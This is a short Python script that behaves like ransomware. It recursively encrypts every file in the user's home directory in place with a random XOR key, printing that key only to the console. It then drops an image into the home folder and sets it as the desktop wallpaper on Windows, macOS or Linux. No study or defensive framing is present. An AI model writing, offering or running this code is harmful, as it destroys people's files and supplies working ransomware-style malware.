import os
import random
import string
import concurrent.futures
import ctypes
import platform
import subprocess
import base64

# ===== Base64 wallpaper image (tiny red dot PNG example) =====
img_base64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMA"
    "ASsJTYQAAAAASUVORK5CYII="
)

def generate_key(length=15):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def xor_encrypt(data, key):
    key_bytes = key.encode()
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))

def encrypt_file(filepath, key):
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = xor_encrypt(data, key)
        with open(filepath, 'wb') as f:
            f.write(encrypted)
        print(f'Encrypted: {filepath}')
    except Exception as e:
        print(f'Skipped (error): {filepath} - {e}')

def encrypt_all_files_multithread(root_dir, key, max_workers=10):
    file_paths = []
    for subdir, _, files in os.walk(root_dir):
        for file in files:
            full_path = os.path.join(subdir, file)
            file_paths.append(full_path)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(encrypt_file, path, key) for path in file_paths]
        concurrent.futures.wait(futures)

def save_base64_image(base64_data, filepath):
    with open(filepath, 'wb') as f:
        f.write(base64.b64decode(base64_data))

def change_wallpaper(image_path):
    system = platform.system()
    try:
        if system == 'Windows':
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        elif system == 'Darwin':  # macOS
            script = f'''/usr/bin/osascript -e 'tell application "Finder" to set desktop picture to POSIX file "{image_path}"' '''
            subprocess.run(script, shell=True)
        elif system == 'Linux':
            # Example for GNOME
            subprocess.run(['gsettings', 'set', 'org.gnome.desktop.background', 'picture-uri', f'file://{image_path}'])
        print(f'Wallpaper changed to: {image_path}')
    except Exception as e:
        print(f'Failed to change wallpaper: {e}')

if __name__ == '__main__':
    user_home = os.path.expanduser("~")
    key = generate_key()
    print(f'Encryption key: {key}')

    print('Starting file encryption...')
    encrypt_all_files_multithread(user_home, key)

    wallpaper_path = os.path.join(user_home, 'wallpaper.png')
    save_base64_image(img_base64, wallpaper_path)
    print('Wallpaper image saved.')

    change_wallpaper(wallpaper_path)